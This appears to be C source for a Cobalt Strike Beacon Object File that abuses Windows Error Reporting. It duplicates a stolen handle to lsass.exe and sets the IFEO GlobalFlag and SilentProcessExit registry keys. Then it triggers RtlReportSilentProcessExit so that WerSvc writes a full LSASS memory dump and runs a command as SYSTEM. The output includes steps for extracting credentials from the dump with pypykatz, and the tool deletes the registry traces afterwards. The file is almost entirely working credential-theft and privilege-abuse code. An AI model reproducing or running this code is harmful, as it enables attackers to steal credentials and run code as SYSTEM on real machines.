
#include <windows.h>
#include <tlhelp32.h>
#include "beacon.h"

#ifndef NTAPI
#define NTAPI __stdcall
#endif

typedef LONG NTSTATUS;
#define NT_SUCCESS(s)                  ((s) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH    ((NTSTATUS)0xC0000004)
#define SE_DEBUG_PRIVILEGE             20
#define SystemExtendedHandleInformation 64
#define DUPLICATE_SAME_ACCESS          0x00000002
#define FLG_MONITOR_SILENT_PROCESS_EXIT 0x200

typedef struct {
    PVOID     Object;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR HandleValue;
    ULONG     GrantedAccess;
    USHORT    CreatorBackTraceIndex;
    USHORT    ObjectTypeIndex;
    ULONG     HandleAttributes;
    ULONG     Reserved;
} SYSTEM_HANDLE_ENTRY_EX;

typedef struct {
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE_ENTRY_EX Handles[1];
} SYSTEM_HANDLE_INFO_EX;

/* NTDLL */
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlAdjustPrivilege(
    ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtQuerySystemInformation(
    ULONG, PVOID, ULONG, PULONG);
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$RtlReportSilentProcessExit(
    HANDLE ProcessHandle, NTSTATUS ExitStatus);

/* KERNEL32 */
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetProcessId(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$DuplicateHandle(
    HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(
    LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(
    LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT void   WINAPI KERNEL32$Sleep(DWORD);

/* ADVAPI32 */
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCreateKeyExA(
    HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPVOID, PHKEY, LPDWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegSetValueExA(
    HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegDeleteValueA(HKEY, LPCSTR);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegDeleteKeyA(HKEY, LPCSTR);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);


static DWORD find_process(const char *name)
{
    HANDLE h; PROCESSENTRY32 pe; DWORD pid = 0;
    h = KERNEL32$CreateToolhelp32Snapshot(0x00000002, 0);
    if (h == INVALID_HANDLE_VALUE) return 0;
    pe.dwSize = sizeof(pe);
    if (KERNEL32$Process32First(h, &pe)) {
        do { if (_stricmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
        } while (KERNEL32$Process32Next(h, &pe));
    }
    KERNEL32$CloseHandle(h);
    return pid;
}

static HANDLE steal_handle(DWORD targetPid, DWORD myPid)
{
    ULONG bufSize = 4 * 1024 * 1024;
    PVOID buf = NULL;
    NTSTATUS st;
    HANDLE stolen = NULL;

    do {
        buf = KERNEL32$VirtualAlloc(NULL, bufSize, 0x3000, 0x04);
        if (!buf) return NULL;
        st = NTDLL$NtQuerySystemInformation(
            SystemExtendedHandleInformation, buf, bufSize, NULL);
        if (st == STATUS_INFO_LENGTH_MISMATCH) {
            KERNEL32$VirtualFree(buf, 0, 0x8000);
            buf = NULL; bufSize *= 2;
        }
    } while (st == STATUS_INFO_LENGTH_MISMATCH && bufSize < 256*1024*1024);

    if (!NT_SUCCESS(st) || !buf) {
        if (buf) KERNEL32$VirtualFree(buf, 0, 0x8000);
        return NULL;
    }

    SYSTEM_HANDLE_INFO_EX *info = (SYSTEM_HANDLE_INFO_EX *)buf;
    DWORD lastSrcPid = 0;
    HANDLE hSrc = NULL;

    for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
        SYSTEM_HANDLE_ENTRY_EX *e = &info->Handles[i];
        if (e->UniqueProcessId == (ULONG_PTR)myPid)      continue;
        if (e->UniqueProcessId == (ULONG_PTR)targetPid)   continue;
        if (e->UniqueProcessId <= 4)                      continue;
        if ((e->GrantedAccess & 0x0410) != 0x0410)        continue;

        if (e->UniqueProcessId != (ULONG_PTR)lastSrcPid) {
            if (hSrc) KERNEL32$CloseHandle(hSrc);
            hSrc = KERNEL32$OpenProcess(0x0040, FALSE, (DWORD)e->UniqueProcessId);
            lastSrcPid = (DWORD)e->UniqueProcessId;
        }
        if (!hSrc) continue;

        HANDLE hDup = NULL;
        if (!KERNEL32$DuplicateHandle(hSrc, (HANDLE)e->HandleValue,
                (HANDLE)-1, &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS))
            continue;
        if (!hDup) continue;

        if (KERNEL32$GetProcessId(hDup) == targetPid) {
            stolen = hDup;
            break;
        }
        KERNEL32$CloseHandle(hDup);
    }
    if (hSrc) KERNEL32$CloseHandle(hSrc);
    KERNEL32$VirtualFree(buf, 0, 0x8000);
    return stolen;
}


void go(char *args, int alen)
{
    char output[4096];
    int pos = 0;
    BOOLEAN wasEnabled;
    HANDLE hTarget = NULL;
    HKEY hIfeo = NULL, hSpe = NULL;
    BOOL regDirty = FALSE;


    const char *targetProc = "lsass.exe";
    const char *monitorCmd = "cmd.exe /c whoami > C:\\Windows\\Temp\\wer_proof.txt";
    const char *dumpFolder = "C:\\Windows\\Temp";

    const char *ifeoBase =
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        "Image File Execution Options\\";
    const char *speBase =
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
        "SilentProcessExit\\";

    char ifeoPath[512];
    char spePath[512];
    _snprintf(ifeoPath, sizeof(ifeoPath), "%s%s", ifeoBase, targetProc);
    _snprintf(spePath, sizeof(spePath), "%s%s", speBase, targetProc);

    pos += _snprintf(output+pos, sizeof(output)-pos,
        "\r\n"
        "============================================================\r\n"
        "  WER Abuse — Trusted Execution + LSASS Dump\r\n"
        "============================================================\r\n\r\n"
        "  ReportingMode = 0x3:\r\n"
        "    0x1 = LAUNCH_MONITORPROCESS (arbitrary exec via WerSvc)\r\n"
        "    0x2 = LOCAL_DUMP (full memory dump)\r\n"
        "    0x3 = BOTH\r\n\r\n"
        "  Executed binary appears as child of svchost.exe (SYSTEM)\r\n\r\n");


    if (!NT_SUCCESS(NTDLL$RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &wasEnabled))) {
        pos += _snprintf(output+pos, sizeof(output)-pos,
            "  [!] SeDebugPrivilege failed (need admin)\r\n");
        BeaconOutput(1, output, pos); return;
    }
    pos += _snprintf(output+pos, sizeof(output)-pos, "  [+] SeDebugPrivilege\r\n");

    DWORD targetPid = find_process(targetProc);
    if (!targetPid) {
        pos += _snprintf(output+pos, sizeof(output)-pos,
            "  [!] %s not found\r\n", targetProc);
        BeaconOutput(1, output, pos); return;
    }
    pos += _snprintf(output+pos, sizeof(output)-pos,
        "  [+] %s PID %lu\r\n", targetProc, (unsigned long)targetPid);

    
    LONG rc = ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, ifeoPath,
        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hIfeo, NULL);
    if (rc != ERROR_SUCCESS) {
        pos += _snprintf(output+pos, sizeof(output)-pos,
            "  [!] IFEO key creation failed (%ld)\r\n", rc);
        BeaconOutput(1, output, pos); return;
    }
    DWORD globalFlag = FLG_MONITOR_SILENT_PROCESS_EXIT;
    ADVAPI32$RegSetValueExA(hIfeo, "GlobalFlag", 0, REG_DWORD,
        (const BYTE*)&globalFlag, sizeof(DWORD));
    pos += _snprintf(output+pos, sizeof(output)-pos,
        "  [+] IFEO GlobalFlag = 0x200\r\n");

    rc = ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, spePath,
        0, NULL, 0, KEY_ALL_ACCESS, NULL, &hSpe, NULL);
    if (rc != ERROR_SUCCESS) {
        pos += _snprintf(output+pos, sizeof(output)-pos,
            "  [!] SilentProcessExit key failed (%ld)\r\n", rc);
        goto cleanup;
    }

    DWORD reportMode = 0x3;  /* LOCAL_DUMP | LAUNCH_MONITORPROCESS */
    DWORD dumpType   = 0x2;  /* MiniDumpWithFullMemory */
    ADVAPI32$RegSetValueExA(hSpe, "ReportingMode", 0, REG_DWORD,
        (const BYTE*)&reportMode, sizeof(DWORD));
    ADVAPI32$RegSetValueExA(hSpe, "LocalDumpFolder", 0, REG_SZ,
        (const BYTE*)dumpFolder, (DWORD)strlen(dumpFolder) + 1);
    ADVAPI32$RegSetValueExA(hSpe, "DumpType", 0, REG_DWORD,
        (const BYTE*)&dumpType, sizeof(DWORD));
    ADVAPI32$RegSetValueExA(hSpe, "MonitorProcess", 0, REG_SZ,
        (const BYTE*)monitorCmd, (DWORD)strlen(monitorCmd) + 1);
    regDirty = TRUE;

    pos += _snprintf(output+pos, sizeof(output)-pos,
        "  [+] SilentProcessExit configured:\r\n"
        "      Dump folder : %s\r\n"
        "      Monitor cmd : %s\r\n",
        dumpFolder, monitorCmd);
    BeaconOutput(0, output, pos); pos = 0;

    hTarget = steal_handle(targetPid, KERNEL32$GetCurrentProcessId());
    if (!hTarget) {
        pos += _snprintf(output+pos, sizeof(output)-pos,
            "  [!] Failed to steal handle\r\n");
        goto cleanup;
    }
    pos += _snprintf(output+pos, sizeof(output)-pos,
        "  [+] Handle acquired via duplication\r\n");

    pos += _snprintf(output+pos, sizeof(output)-pos,
        "  [*] Triggering RtlReportSilentProcessExit...\r\n"
        "  [*] WerSvc will:\r\n"
        "      1. Create dump via WerFault.exe\r\n"
        "      2. Launch MonitorProcess as SYSTEM (child of svchost)\r\n");
    BeaconOutput(0, output, pos); pos = 0;

    NTSTATUS st = NTDLL$RtlReportSilentProcessExit(hTarget, 0);

    if (!NT_SUCCESS(st)) {
        pos += _snprintf(output+pos, sizeof(output)-pos,
            "  [!] RtlReportSilentProcessExit failed: 0x%08lX\r\n",
            (unsigned long)st);
        goto cleanup;
    }

    pos += _snprintf(output+pos, sizeof(output)-pos,
        "  [+] Triggered successfully. Waiting 15s for WER pipeline...\r\n");
    BeaconOutput(0, output, pos); pos = 0;

    KERNEL32$Sleep(15000);

    pos += _snprintf(output+pos, sizeof(output)-pos,
        "  [+] Expected results:\r\n"
        "      Dump: %s\\%s(%lu)\\*.dmp\r\n"
        "      Exec: C:\\Windows\\Temp\\wer_proof.txt (should say SYSTEM)\r\n"
        "\r\n"
        "  [*] To verify execution:\r\n"
        "      type C:\\Windows\\Temp\\wer_proof.txt\r\n"
        "  [*] To parse dump:\r\n"
        "      pypykatz lsa minidump <path_to_dmp>\r\n",
        dumpFolder, targetProc, (unsigned long)targetPid);

cleanup:
    if (regDirty) {
        ADVAPI32$RegDeleteKeyA(HKEY_LOCAL_MACHINE, spePath);
        if (hIfeo) ADVAPI32$RegDeleteValueA(hIfeo, "GlobalFlag");
        pos += _snprintf(output+pos, sizeof(output)-pos,
            "  [+] Registry cleaned up\r\n");
    }

    if (hSpe)    ADVAPI32$RegCloseKey(hSpe);
    if (hIfeo)   ADVAPI32$RegCloseKey(hIfeo);
    if (hTarget) KERNEL32$CloseHandle(hTarget);

    BeaconOutput(0, output, pos);
}
